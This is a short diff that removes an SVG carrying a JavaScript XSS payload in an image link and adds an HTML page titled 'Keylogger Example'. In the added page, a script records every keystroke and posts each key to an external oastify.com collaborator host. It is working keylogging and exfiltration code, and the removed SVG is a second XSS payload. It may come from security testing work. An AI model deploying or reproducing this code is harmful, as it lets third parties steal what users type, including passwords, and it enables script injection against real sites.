@@ -1,3 +1,22 @@
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" height="100" width="100">
-  <image xlink:href="javascript:alert('XSS')" height="100" width="100" />
-</svg>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Keylogger Example</title>
+    <script>
+        document.addEventListener('DOMContentLoaded', (event) => {
+            document.addEventListener('keydown', function(event) {
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", "https://jm9og1n49odqsye7958ufpw0oruii96y.oastify.com/log", true);
+                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                xhr.send("key=" + event.key);
+            });
+        });
+    </script>
+</head>
+<body>
+    <h1>Keylogger Example</h1>
+    <p>Type something to see the keylogger in action.</p>
+</body>
+</html>
